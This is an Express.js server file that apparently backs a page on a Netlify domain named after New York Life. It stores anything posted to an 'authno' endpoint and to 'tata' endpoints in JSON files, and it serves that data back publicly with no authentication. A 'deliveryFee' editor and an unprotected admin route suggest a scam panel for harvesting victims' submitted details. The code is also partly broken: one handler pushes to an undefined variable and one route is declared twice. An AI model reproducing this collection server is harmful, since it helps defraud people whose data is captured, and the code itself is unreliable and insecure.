const express = require ("express");
const fs = require ("fs");
const path = require("path");
const cors = require("cors");


const PORT = 3000

const app = express();

const corsOptions = {
    //origin: 'http://localhost:3000',
    origin: 'https://newyorklife.netlify.app',
    optionsSuccessStatus: 200 // Fixed typo: optionsSuccessStatus
};

app.use(cors(corsOptions));


app.use(express.json());
app.use(express.static("public"));


app.post("/authno", async (req, res)=>{
    let rata = [];

    if (fs.existsSync("rata.json")){
        rata = JSON.parse(await
  fs.promises.readFile("rata.json", "utf8"));
    }
    rata.push(req.body);
    await fs.promises.writeFile("rata.json",
JSON.stringify(rata));
        res.send("numberg");
}
)
app.get("/rata", async (req, res) => {
    if(!fs.existsSync("rata.json")) return res.json([]);
    const rata = JSON.parse(await
        fs.promises.readFile("rata.json", "utf8"))
        res.json(rata);
})
app.post('/tat', async (req, res) => {
    try {
        let tata = [];
        if (fs.existsSync("tata.json")) {
            const data = await fs.promises.readFile("tata.json", "utf8");
            if (data.trim()) tata = JSON.parse(data);
        }
        vault.push(req.body);
        await fs.promises.writeFile("tata.json", JSON.stringify(tata, null, 2));
        res.json({ success: true }); 
    } catch (error) {
        res.status(500).json({ success: false });
    }
});
app.put("/tata/:nextId", async (req, res) => {
    const filePath = "tata.json";
    const targetId = req.params.nextId; // No decode needed, no #
    const { deliveryFee } = req.body;

    try {
        if (fs.existsSync(filePath)) {
            const data = await fs.promises.readFile(filePath, "utf8");
            let vault = JSON.parse(data);
            const index = vault.findIndex(item => item.nextId === targetId);

            if (index !== -1) {
                vault[index].deliveryFee = deliveryFee;
                vault[index].updatedAt = new Date().toISOString();
                await fs.promises.writeFile(filePath, JSON.stringify(vault, null, 2));
                return res.status(200).json({ message: "Success" });
            }
            return res.status(404).json({ error: `ID ${targetId} not found` });
        }
        res.status(404).json({ error: "File not found" });
    } catch (error) {
        res.status(500).json({ error: "Server error" });
    }
});
app.get("/tata", async (req, res) => {
    if(!fs.existsSync("tata.json")) return res.json([]);
    const tata = JSON.parse(await
        fs.promises.readFile("tata.json", "utf8"));
        res.json(tata);
});

app.post("/tata", async (req, res)=>{
    let tata = [];

    if (fs.existsSync("tata.json")){
        tata = JSON.parse(await
  fs.promises.readFile("tata.json", "utf8"));
    }
    tata.push(req.body);
    await fs.promises.writeFile("tata.json",
JSON.stringify(tata));
        res.send("Contact");
});

app.get("/tata", async (req, res) => {
    if(!fs.existsSync("tata.json")) return res.json([]);
    const tata = JSON.parse(await
        fs.promises.readFile("tata.json", "utf8"));
        res.json(tata);
});

app.get("/bg", (req, res) => {
    const bgFile = path.join(__dirname, "bg.json")
    if(!fs.existsSync(bgFile)) {
        return res.json({ image: "good.svg"})
    }
    const data = JSON.parse(fs.readFileSync(bgFile));
    res.json(data);
});

app.post("/admin/set-bg", (req, res) => {
    const bgFile = path.join(__dirname, "bg.json")
    fs.writeFileSync(bgFile, JSON.stringify({ image: req.body.image }));
    res.send("ok");
});




app.use(express.static(__dirname))

app.listen(PORT, ()=>{
    console.log(`APP RUNNING ON PORT ${PORT}`)
})
